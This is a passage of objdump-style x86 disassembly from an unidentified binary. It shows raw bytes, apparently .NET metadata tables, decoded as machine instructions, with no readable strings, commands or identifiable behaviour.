  4069b2:	c0 54 00 00 00       	rclb   $0x0,0x0(%eax,%eax,1)
  4069b7:	00 86 08 c9 25 5a    	add    %al,0x5a25c908(%esi)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	7c 0f                	jl     0x4069d9
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	b5 1d                	mov    $0x1d,%ch
  4069d8:	64 02 5c 00 7c       	add    %fs:0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	ec                   	in     (%dx),%al
  4069e5:	1d 0e 00 5c 00       	sbb    $0x5c000e,%eax
  4069ea:	20 55 00             	and    %dl,0x0(%ebp)
  4069ed:	00 00                	add    %al,(%eax)
  4069ef:	00 96 00 ed 26 b1    	add    %dl,-0x4ed91300(%esi)
  4069f5:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 82 08 b8 02 5e    	add    %al,0x5e02b808(%edx)
  406a05:	00 44 55 00          	add    %al,0x0(%ebp,%edx,2)
  406a09:	00 00                	add    %al,(%eax)
  406a0b:	00 96 00 9f 12 be    	add    %dl,-0x41ed6100(%esi)
  406a11:	02 5f 00             	add    0x0(%edi),%bl
  406a14:	78 20                	js     0x406a36
  406a16:	00 00                	add    %al,(%eax)
  406a18:	00 00                	add    %al,(%eax)
  406a1a:	86 18                	xchg   %bl,(%eax)
  406a1c:	ec                   	in     (%dx),%al
  406a1d:	1d 0e 00 61 00       	sbb    $0x61000e,%eax
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 aa 04 c5 02 61    	add    %ch,0x6102c504(%edx)
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 93 05 cb 02 62    	add    %dl,0x6202cb05(%ebx)
  406a3d:	00 cc                	add    %cl,%ah
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 60 02             	add    %ah,0x2(%eax)
  406a48:	d2 02                	rolb   %cl,(%edx)
  406a4a:	64 00 ab 25 00 00 00 	add    %ch,%fs:0x25(%ebx)
  406a51:	00 96 00 da 17 da    	add    %dl,-0x25e82600(%esi)
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 3a                	add    %bh,(%edx)
  406a63:	17                   	pop    %ss
  406a64:	e1 02                	loope  0x406a68
  406a66:	68 00 e6 25 00       	push   $0x25e600
  406a6b:	00 00                	add    %al,(%eax)
  406a6d:	00 96 00 81 03 e8    	add    %dl,-0x17fc7f00(%esi)
  406a73:	02 6a 00             	add    0x0(%edx),%ch
  406a76:	6c                   	insb   (%dx),%es:(%edi)
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 40 05             	add    %al,0x5(%eax)
  406a80:	ef                   	out    %eax,(%dx)
  406a81:	02 6c 00 9c          	add    -0x64(%eax,%eax,1),%ch
  406a85:	57                   	push   %edi
  406a86:	00 00                	add    %al,(%eax)
  406a88:	00 00                	add    %al,(%eax)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 35 03 f6 02 6e    	add    %dh,0x6e02f603
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	ec                   	in     (%dx),%al
  406a9b:	1d 0e 00 70 00       	sbb    $0x70000e,%eax
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 3d 1b 84 01 70    	add    %bh,0x7001841b
  406aad:	00 6c 59 00          	add    %ch,0x0(%ecx,%ebx,2)
  406ab1:	00 00                	add    %al,(%eax)
  406ab3:	00 96 00 44 0a 84    	add    %dl,-0x7bf5bc00(%esi)
  406ab9:	01 71 00             	add    %esi,0x0(%ecx)
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	ab                   	stos   %eax,%es:(%edi)
  406ac1:	07                   	pop    %es
  406ac2:	00 00                	add    %al,(%eax)
  406ac4:	01 00                	add    %eax,(%eax)
  406ac6:	7e 04                	jle    0x406acc
  406ac8:	00 00                	add    %al,(%eax)
  406aca:	01 00                	add    %eax,(%eax)
  406acc:	ae                   	scas   %es:(%edi),%al
  406acd:	15 00 00 01 00       	adc    $0x10000,%eax
  406ad2:	4d                   	dec    %ebp
  406ad3:	09 00                	or     %eax,(%eax)
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 9c 00 00 00 01 00 	add    %bl,0x10000(%eax,%eax,1)
  406ade:	4b                   	dec    %ebx
  406adf:	17                   	pop    %ss
  406ae0:	00 00                	add    %al,(%eax)
  406ae2:	01 00                	add    %eax,(%eax)
  406ae4:	d2 0c 00             	rorb   %cl,(%eax,%eax,1)
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 df                	add    %bl,%bh
  406aeb:	18 00                	sbb    %al,(%eax)
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 03                	add    %al,(%ebx)
  406af1:	09 00                	or     %eax,(%eax)
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 d9                	add    %bl,%cl
  406af7:	01 00                	add    %eax,(%eax)
  406af9:	00 01                	add    %al,(%ecx)
  406afb:	00 1f                	add    %bl,(%edi)
  406afd:	09 00                	or     %eax,(%eax)
  406aff:	00 01                	add    %al,(%ecx)
  406b01:	00 11                	add    %dl,(%ecx)
  406b03:	27                   	daa
  406b04:	00 00                	add    %al,(%eax)
  406b06:	02 00                	add    (%eax),%al
  406b08:	2f                   	das
  406b09:	09 00                	or     %eax,(%eax)
  406b0b:	00 03                	add    %al,(%ebx)
  406b0d:	00 2c 24             	add    %ch,(%esp)
  406b10:	00 00                	add    %al,(%eax)
  406b12:	04 00                	add    $0x0,%al
  406b14:	20 04 00             	and    %al,(%eax,%eax,1)
  406b17:	00 01                	add    %al,(%ecx)
  406b19:	00 f4                	add    %dh,%ah
  406b1b:	14 00                	adc    $0x0,%al
  406b1d:	00 01                	add    %al,(%ecx)
  406b1f:	00 84 12 00 00 01 00 	add    %al,0x10000(%edx,%edx,1)
  406b26:	92                   	xchg   %eax,%edx
  406b27:	15 00 00 01 00       	adc    $0x10000,%eax
  406b2c:	ab                   	stos   %eax,%es:(%edi)
  406b2d:	08 00                	or     %al,(%eax)
  406b2f:	00 01                	add    %al,(%ecx)
  406b31:	00 f7                	add    %dh,%bh
  406b33:	05 00 00 01 00       	add    $0x10000,%eax
  406b38:	f0 06                	lock push %es
  406b3a:	00 00                	add    %al,(%eax)
  406b3c:	01 00                	add    %eax,(%eax)
  406b3e:	ee                   	out    %al,(%dx)
  406b3f:	09 00                	or     %eax,(%eax)
  406b41:	00 02                	add    %al,(%edx)
  406b43:	00 e7                	add    %ah,%bh
  406b45:	14 00                	adc    $0x0,%al
  406b47:	00 03                	add    %al,(%ebx)
  406b49:	00 1c 16             	add    %bl,(%esi,%edx,1)
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	01 00                	add    %eax,(%eax)
  406b50:	68 06 00 00 01       	push   $0x1000006
  406b55:	00 83 25 00 00 02    	add    %al,0x2000025(%ebx)
  406b5b:	00 fc                	add    %bh,%ah
  406b5d:	04 00                	add    $0x0,%al
  406b5f:	00 01                	add    %al,(%ecx)
  406b61:	00 39                	add    %bh,(%ecx)
  406b63:	02 00                	add    (%eax),%al
  406b65:	00 01                	add    %al,(%ecx)
  406b67:	00 ae 0a 00 00 02    	add    %ch,0x200000a(%esi)
  406b6d:	00 9c 06 00 00 03 00 	add    %bl,0x30000(%esi,%eax,1)
  406b74:	bb 07 00 00 01       	mov    $0x1000007,%ebx
  406b79:	00 c6                	add    %al,%dh
  406b7b:	24 00                	and    $0x0,%al
  406b7d:	00 02                	add    %al,(%edx)
  406b7f:	00 94 1b 00 00 01 00 	add    %dl,0x10000(%ebx,%ebx,1)
  406b86:	df 03                	filds  (%ebx)
  406b88:	00 00                	add    %al,(%eax)
  406b8a:	02 00                	add    (%eax),%al
  406b8c:	03 13                	add    (%ebx),%edx
  406b8e:	00 00                	add    %al,(%eax)
  406b90:	01 00                	add    %eax,(%eax)
  406b92:	be 01 00 00 01       	mov    $0x1000001,%esi
  406b97:	00 77 02             	add    %dh,0x2(%edi)
  406b9a:	00 00                	add    %al,(%eax)
  406b9c:	01 00                	add    %eax,(%eax)
  406b9e:	94                   	xchg   %eax,%esp
  406b9f:	01 00                	add    %eax,(%eax)
  406ba1:	00 01                	add    %al,(%ecx)
  406ba3:	00 ba 12 00 00 01    	add    %bh,0x1000012(%edx)
  406ba9:	00 d3                	add    %dl,%bl
  406bab:	06                   	push   %es
  406bac:	00 00                	add    %al,(%eax)
  406bae:	01 00                	add    %eax,(%eax)
  406bb0:	1d 1c 00 00 01       	sbb    $0x100001c,%eax
  406bb5:	00 bb 15 00 00 01    	add    %bh,0x1000015(%ebx)
  406bbb:	00 05 27 00 00 01    	add    %al,0x1000027
  406bc1:	00 dc                	add    %bl,%ah
  406bc3:	1b 00                	sbb    (%eax),%eax
  406bc5:	00 01                	add    %al,(%ecx)
  406bc7:	00 c4                	add    %al,%ah
  406bc9:	21 00                	and    %eax,(%eax)
  406bcb:	00 01                	add    %al,(%ecx)
  406bcd:	00 0b                	add    %cl,(%ebx)
  406bcf:	05 00 00 02 00       	add    $0x20000,%eax
  406bd4:	3a 25 00 00 01 00    	cmp    0x10000,%ah
  406bda:	a2 25 00 00 01       	mov    %al,0x1000025
  406bdf:	00 00                	add    %al,(%eax)
  406be1:	21 00                	and    %eax,(%eax)
  406be3:	00 01                	add    %al,(%ecx)
  406be5:	00 4a 06             	add    %cl,0x6(%edx)
  406be8:	00 00                	add    %al,(%eax)
  406bea:	01 00                	add    %eax,(%eax)
  406bec:	9c                   	pushf
  406bed:	03 00                	add    (%eax),%eax
  406bef:	00 01                	add    %al,(%ecx)
  406bf1:	00 b8 06 00 00 01    	add    %bh,0x1000006(%eax)
  406bf7:	00 c0                	add    %al,%al
  406bf9:	1b 00                	sbb    (%eax),%eax
  406bfb:	00 01                	add    %al,(%ecx)
  406bfd:	00 9d 09 00 00 01    	add    %bl,0x1000009(%ebp)
  406c03:	00 9f 15 00 00 01    	add    %bl,0x1000015(%edi)
  406c09:	00 0c 03             	add    %cl,(%ebx,%eax,1)
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	12 06                	adc    (%esi),%al
  406c12:	00 00                	add    %al,(%eax)
  406c14:	01 00                	add    %eax,(%eax)
  406c16:	86 1b                	xchg   %bl,(%ebx)
  406c18:	00 00                	add    %al,(%eax)
  406c1a:	01 00                	add    %eax,(%eax)
  406c1c:	a2 0a 00 00 01       	mov    %al,0x100000a
  406c21:	00 40 1a             	add    %al,0x1a(%eax)
  406c24:	00 00                	add    %al,(%eax)
  406c26:	02 00                	add    (%eax),%al
  406c28:	e1 07                	loope  0x406c31
  406c2a:	00 00                	add    %al,(%eax)
  406c2c:	01 00                	add    %eax,(%eax)
  406c2e:	07                   	pop    %es
  406c2f:	08 00                	or     %al,(%eax)
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 77 1b             	add    %dh,0x1b(%edi)
  406c36:	00 00                	add    %al,(%eax)
  406c38:	01 00                	add    %eax,(%eax)
  406c3a:	3a 07                	cmp    (%edi),%al
  406c3c:	00 00                	add    %al,(%eax)
  406c3e:	01 00                	add    %eax,(%eax)
  406c40:	05 06 00 00 01       	add    $0x1000006,%eax
  406c45:	00 15 13 00 00 01    	add    %dl,0x1000013
  406c4b:	00 aa 02 00 00 01    	add    %ch,0x1000002(%edx)
  406c51:	00 8e 03 00 00 01    	add    %cl,0x1000003(%esi)
  406c57:	00 df                	add    %bl,%bh
  406c59:	24 00                	and    $0x0,%al
  406c5b:	00 01                	add    %al,(%ecx)
  406c5d:	00 d3                	add    %dl,%bl
  406c5f:	26 00 00             	add    %al,%es:(%eax)
  406c62:	01 00                	add    %eax,(%eax)
  406c64:	01 07                	add    %eax,(%edi)
  406c66:	00 00                	add    %al,(%eax)
  406c68:	01 00                	add    %eax,(%eax)
  406c6a:	93                   	xchg   %eax,%ebx
  406c6b:	12 00                	adc    (%eax),%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 b1 1b 00 00 01    	add    %dh,0x100001b(%ecx)
  406c75:	00 5b 13             	add    %bl,0x13(%ebx)
  406c78:	00 00                	add    %al,(%eax)
  406c7a:	02 00                	add    (%eax),%al
  406c7c:	e6 02                	out    %al,$0x2
  406c7e:	00 00                	add    %al,(%eax)
  406c80:	01 00                	add    %eax,(%eax)
  406c82:	2b 02                	sub    (%edx),%eax
  406c84:	00 00                	add    %al,(%eax)
  406c86:	02 00                	add    (%eax),%al
  406c88:	0f 1b 00             	bndstx %bnd0,(%eax)
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 43 08             	add    %al,0x8(%ebx)
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	8e 24 00             	mov    (%eax,%eax,1),%fs
  406c97:	00 01                	add    %al,(%ecx)
  406c99:	00 ae 12 00 00 01    	add    %ch,0x1000012(%esi)
  406c9f:	00 6a 05             	add    %ch,0x5(%edx)
  406ca2:	00 00                	add    %al,(%eax)
  406ca4:	01 00                	add    %eax,(%eax)
  406ca6:	18 08                	sbb    %cl,(%eax)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	f6 12                	notb   (%edx)
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	24 25                	and    $0x25,%al
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	27                   	daa
  406cb9:	03 00                	add    (%eax),%eax
  406cbb:	00 01                	add    %al,(%ecx)
  406cbd:	00 85 0a 00 00 01    	add    %al,0x100000a(%ebp)
  406cc3:	00 05 0a 00 00 01    	add    %al,0x100000a
  406cc9:	00 cc                	add    %cl,%ah
  406ccb:	05 00 00 01 00       	add    $0x10000,%eax
  406cd0:	b8 09 00 00 01       	mov    $0x1000009,%eax
  406cd5:	00 2f                	add    %ch,(%edi)
  406cd7:	1b 00                	sbb    (%eax),%eax
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 1e                	add    %bl,(%esi)
  406cdd:	24 00                	and    $0x0,%al
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 f9                	add    %bh,%cl
  406ce3:	26 00 00             	add    %al,%es:(%eax)
  406ce6:	02 00                	add    (%eax),%al
  406ce8:	2f                   	das
  406ce9:	25 00 00 01 00       	and    $0x10000,%eax
  406cee:	cb                   	lret
  406cef:	1a 00                	sbb    (%eax),%al
  406cf1:	00 01                	add    %al,(%ecx)
  406cf3:	00 be 1a 00 00 02    	add    %bh,0x200001a(%esi)
  406cf9:	00 94 16 00 00 01 00 	add    %dl,0x10000(%esi,%edx,1)
  406d00:	70 23                	jo     0x406d25
  406d02:	00 00                	add    %al,(%eax)
  406d04:	01 00                	add    %eax,(%eax)
  406d06:	4e                   	dec    %esi
  406d07:	05 00 00 02 00       	add    $0x20000,%eax
  406d0c:	df 06                	filds  (%esi)
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	49                   	dec    %ecx
  406d13:	07                   	pop    %es
  406d14:	00 00                	add    %al,(%eax)
  406d16:	02 00                	add    (%eax),%al
  406d18:	35 1e 00 00 01       	xor    $0x100001e,%eax
  406d1d:	00 ff                	add    %bh,%bh
  406d1f:	03 00                	add    (%eax),%eax
  406d21:	00 02                	add    %al,(%edx)
  406d23:	00 86 02 00 00 01    	add    %al,0x1000002(%esi)
  406d29:	00 ce                	add    %cl,%dh
  406d2b:	17                   	pop    %ss
  406d2c:	00 00                	add    %al,(%eax)
  406d2e:	02 00                	add    (%eax),%al
  406d30:	01 16                	add    %edx,(%esi)
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	4c                   	dec    %esp
  406d37:	1e                   	push   %ds
  406d38:	00 00                	add    %al,(%eax)
  406d3a:	02 00                	add    (%eax),%al
  406d3c:	28 1e                	sub    %bl,(%esi)
  406d3e:	00 00                	add    %al,(%eax)
  406d40:	01 00                	add    %eax,(%eax)
  406d42:	21 23                	and    %esp,(%ebx)
  406d44:	00 00                	add    %al,(%eax)
  406d46:	02 00                	add    (%eax),%al
  406d48:	c6 04 00 00          	movb   $0x0,(%eax,%eax,1)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	94                   	xchg   %eax,%esp
  406d4f:	0a 00                	or     (%eax),%al
  406d51:	00 02                	add    %al,(%edx)
  406d53:	00 79 05             	add    %bh,0x5(%ecx)
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	15 01 00 00 01       	adc    $0x1000001,%eax
  406d5f:	00 e2                	add    %ah,%dl
  406d61:	04 16                	add    $0x16,%al
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 82 22 bb    	add    %dh,-0x44dd7e00(%ecx)
  406d6f:	01 b1 00 4d 23 bf    	add    %esi,-0x40dcb300(%ecx)
  406d75:	01 b1 00 9d 21 0e    	add    %esi,0xe219d00(%ecx)
  406d7b:	00 b9 00 d4 1d 64    	add    %bh,0x641dd400(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 ec                	add    %ch,%ah
  406d85:	1d 01 03 d1 00       	sbb    $0xd10301,%eax
  406d8a:	ec                   	in     (%dx),%al
  406d8b:	1d 0e 00 d9 00       	sbb    $0xd9000e,%eax
  406d90:	ec                   	in     (%dx),%al
  406d91:	1d 2e 03 e9 00       	sbb    $0xe9032e,%eax
  406d96:	ec                   	in     (%dx),%al
  406d97:	1d 6b 01 f1 00       	sbb    $0xf1016b,%eax
  406d9c:	ec                   	in     (%dx),%al
  406d9d:	1d 6b 01 f9 00       	sbb    $0xf9016b,%eax
  406da2:	ec                   	in     (%dx),%al
  406da3:	1d 6b 01 01 01       	sbb    $0x101016b,%eax
  406da8:	ec                   	in     (%dx),%al
  406da9:	1d 6b 01 09 01       	sbb    $0x109016b,%eax
  406dae:	ec                   	in     (%dx),%al
  406daf:	1d 6b 01 11 01       	sbb    $0x111016b,%eax
  406db4:	ec                   	in     (%dx),%al
  406db5:	1d 6b 01 19 01       	sbb    $0x119016b,%eax
  406dba:	ec                   	in     (%dx),%al
  406dbb:	1d 6b 01 21 01       	sbb    $0x121016b,%eax
  406dc0:	ec                   	in     (%dx),%al
  406dc1:	1d 6b 01 29 01       	sbb    $0x129016b,%eax
  406dc6:	ec                   	in     (%dx),%al
  406dc7:	1d 6b 01 31 01       	sbb    $0x131016b,%eax
  406dcc:	ec                   	in     (%dx),%al
  406dcd:	1d 4b 02 39 01       	sbb    $0x139024b,%eax
  406dd2:	ec                   	in     (%dx),%al
  406dd3:	1d 0e 00 41 01       	sbb    $0x141000e,%eax
  406dd8:	ec                   	in     (%dx),%al
  406dd9:	1d 6b 01 49 01       	sbb    $0x149016b,%eax
  406dde:	1b 1b                	sbb    (%ebx),%ebx
  406de0:	7f 00                	jg     0x406de2
  406de2:	51                   	push   %ecx
  406de3:	01 44 00 c4          	add    %eax,-0x3c(%eax,%eax,1)
  406de7:	03 59 01             	add    0x1(%ecx),%ebx
  406dea:	bf 21 7f 00 51       	mov    $0x51007f21,%edi
  406def:	01 fb                	add    %edi,%ebx
  406df1:	18 84 00 09 00 ec 1d 	sbb    %al,0x1dec0009(%eax,%eax,1)
  406df8:	0e                   	push   %cs
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	8a 00                	mov    (%eax),%al
  406dfe:	cd 03                	int    $0x3
  406e00:	51                   	push   %ecx
  406e01:	01 ea                	add    %ebp,%edx
  406e03:	13 2a                	adc    (%edx),%ebp
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	3c 14                	cmp    $0x14,%al
  406e0a:	d3 03                	roll   %cl,(%ebx)
  406e0c:	11 00                	adc    %eax,(%eax)
  406e0e:	ec                   	in     (%dx),%al
  406e0f:	1d 2b 02 11 00       	sbb    $0x11022b,%eax
  406e14:	fd                   	std
  406e15:	25 d9 03 69 01       	and    $0x16903d9,%eax
  406e1a:	d5 25                	aad    $0x25
  406e1c:	df 03                	filds  (%ebx)
  406e1e:	61                   	popa
  406e1f:	01 6f 1f             	add    %ebp,0x1f(%edi)
  406e22:	e5 03                	in     $0x3,%eax
  406e24:	81 01 6c 01 c7 00    	addl   $0xc7016c,(%ecx)
  406e2a:	79 01                	jns    0x406e2d
  406e2c:	0e                   	push   %cs
  406e2d:	15 eb 03 19 00       	adc    $0x1903eb,%eax
  406e32:	ec                   	in     (%dx),%al
  406e33:	1d 09 04 19 00       	sbb    $0x190409,%eax
  406e38:	62 12                	bound  %edx,(%edx)
  406e3a:	01 03                	add    %eax,(%ebx)
  406e3c:	19 00                	sbb    %eax,(%eax)
  406e3e:	4f                   	dec    %edi
  406e3f:	12 01                	adc    (%ecx),%al
  406e41:	03 c1                	add    %ecx,%eax
  406e43:	01 7b 26             	add    %edi,0x26(%ebx)
  406e46:	16                   	push   %ss
  406e47:	04 c1                	add    $0xc1,%al
  406e49:	01 b9 21 1c 04 d1    	add    %edi,-0x2efbe3df(%ecx)
  406e4f:	01 ec                	add    %ebp,%esp
  406e51:	1d 0e 00 d1 01       	sbb    $0x1d1000e,%eax
  406e56:	51                   	push   %ecx
  406e57:	23 23                	and    (%ebx),%esp
  406e59:	04 d9                	add    $0xd9,%al
  406e5b:	01 10                	add    %edx,(%eax)
  406e5d:	1f                   	pop    %ds
  406e5e:	28 04 19             	sub    %al,(%ecx,%ebx,1)
  406e61:	00 59 21             	add    %bl,0x21(%ecx)
  406e64:	30 04 19             	xor    %al,(%ecx,%ebx,1)
  406e67:	00 52 0b             	add    %dl,0xb(%edx)
  406e6a:	bf 01 19 00 59       	mov    $0x59001901,%edi
  406e6f:	21 3c 02             	and    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 ec                	add    %ebp,%esp
  406e75:	1d 0e 00 a1 01       	sbb    $0x1a1000e,%eax
  406e7a:	ec                   	in     (%dx),%al
  406e7b:	1d 36 02 99 01       	sbb    $0x1990236,%eax
  406e80:	eb 1f                	jmp    0x406ea1
  406e82:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e85:	01 0a                	add    %ecx,(%edx)
  406e87:	14 70                	adc    $0x70,%al
  406e89:	01 c1                	add    %eax,%ecx
  406e8b:	01 b9 21 3f 04 d1    	add    %edi,-0x2efbc0df(%ecx)
  406e91:	01 51 23             	add    %edx,0x23(%ecx)
  406e94:	49                   	dec    %ecx
  406e95:	04 f1                	add    $0xf1,%al
  406e97:	01 c6                	add    %eax,%esi
  406e99:	0f 0e                	femms
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 ec                	add    %ebp,%esp
  406e9f:	1d 4f 04 01 02       	sbb    $0x201044f,%eax
  406ea4:	ec                   	in     (%dx),%al
  406ea5:	1d 56 04 21 00       	sbb    $0x210456,%eax
  406eaa:	ec                   	in     (%dx),%al
  406eab:	1d 5c 04 19 00       	sbb    $0x19045c,%eax
  406eb0:	b4 22                	mov    $0x22,%ah
  406eb2:	66 04 09             	data16 add $0x9,%al
  406eb5:	00 19                	add    %bl,(%ecx)
  406eb7:	14 47                	adc    $0x47,%al
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 30                	add    %dh,(%eax)
  406ebd:	22 6c 04 29          	and    0x29(%esp,%eax,1),%ch
  406ec1:	02 ec                	add    %ah,%ch
  406ec3:	1d 56 04 29 00       	sbb    $0x290456,%eax
  406ec8:	ec                   	in     (%dx),%al
  406ec9:	1d 78 04 31 02       	sbb    $0x2310478,%eax
  406ece:	ec                   	in     (%dx),%al
  406ecf:	1d 56 04 c1 00       	sbb    $0xc10456,%eax
  406ed4:	2a 0b                	sub    (%ebx),%cl
  406ed6:	82 04 39 02          	addb   $0x2,(%ecx,%edi,1)
  406eda:	21 0f                	and    %ecx,(%edi)
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 fb                	add    %bh,%bl
  406ee1:	1f                   	pop    %ds
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 c6                	add    %al,%dh
  406ee7:	0f 0e                	femms
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 c6                	add    %al,%dh
  406eed:	0f 0e                	femms
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 c6                	add    %al,%dh
  406ef3:	0f 0e                	femms
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 22                	add    %ah,(%edx)
  406ef9:	0b a1 04 49 02 44    	or     0x44024904(%ecx),%esp
  406eff:	00 a7 04 c1 00 2f    	add    %ah,0x2f00c104(%edi)
  406f05:	0b ae 04 51 02 ec    	or     -0x13fdaefc(%esi),%ebp
  406f0b:	1d 56 04 49 01       	sbb    $0x1490456,%eax
  406f10:	ec                   	in     (%dx),%al
  406f11:	1d b6 04 49 01       	sbb    $0x14904b6,%eax
  406f16:	03 23                	add    (%ebx),%esp
  406f18:	bd 04 61 02 62       	mov    $0x62026104,%ebp
  406f1d:	1d cf 04 49 02       	sbb    $0x24904cf,%eax
  406f22:	6f                   	outsl  %ds:(%esi),(%dx)
  406f23:	1f                   	pop    %ds
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 8f 17 d6 04 c1    	add    %cl,-0x3efb29e9(%edi)
  406f2d:	00 1e                	add    %bl,(%esi)
  406f2f:	10 de                	adc    %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 ec                	add    %ah,%ch
  406f35:	1d 2b 02 c1 00       	sbb    $0xc1022b,%eax
  406f3a:	e7 19                	out    %eax,$0x19
  406f3c:	15 02 c1 00 19       	adc    $0x1900c102,%eax
  406f41:	15 0e 00 61 02       	adc    $0x261000e,%eax
  406f46:	bf 21 9a 00 71       	mov    $0x71009a21,%edi
  406f4b:	02 51 21             	add    0x21(%ecx),%dl
  406f4e:	0a 00                	or     (%eax),%al
  406f50:	59                   	pop    %ecx
  406f51:	01 e8                	add    %ebp,%eax
  406f53:	1e                   	push   %ds
  406f54:	c7 00 a1 02 64 0f    	movl   $0xf6402a1,(%eax)
  406f5a:	01 05 79 02 ec 1d    	add    %eax,0x1dec0279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 92 20 07 05 81    	add    -0x7efaf8e0(%edx),%dl
  406f69:	02 69 0e             	add    0xe(%ecx),%ch
  406f6c:	0d 05 a9 02 b2       	or     $0xb202a905,%eax
  406f71:	0e                   	push   %cs
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 07 0f 47    	add    0x470f0702(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 87 26 16 04 81    	add    %eax,-0x7efbe9da(%edi)
  406f81:	02 03                	add    (%ebx),%al
  406f83:	1f                   	pop    %ds
  406f84:	13 05 81 02 8a 17    	adc    0x178a0281,%eax
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 ec 1d 0e    	add    %cl,0xe1dec02(%ecx)
  406f91:	00 89 02 bf 0e 6b    	add    %cl,0x6b0ebf02(%ecx)
  406f97:	01 b1 02 a9 0e 47    	add    %esi,0x470ea902(%ecx)
  406f9d:	02 a1 02 35 19 c7    	add    -0x38e6cafe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 11                	add    %edx,(%ecx)
  406fa7:	21 1a                	and    %ebx,(%edx)
  406fa9:	05 89 02 c1 20       	add    $0x20c10289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 86 0e 20 05 89    	add    -0x76fadff2(%esi),%al
  406fb7:	02 01                	add    (%ecx),%al
  406fb9:	25 4b 02 81 02       	and    $0x281024b,%eax
  406fbe:	03 23                	add    (%ebx),%esp
  406fc0:	27                   	daa
  406fc1:	05 c1 02 3e 1d       	add    $0x1d3e02c1,%eax
  406fc6:	30 05 c9 02 d4 0f    	xor    %al,0xfd402c9
  406fcc:	c7 00 91 02 f2 25    	movl   $0x25f20291,(%eax)
  406fd2:	35 05 c1 01 11       	xor    $0x1101c105,%eax
  406fd7:	21 3f                	and    %edi,(%edi)
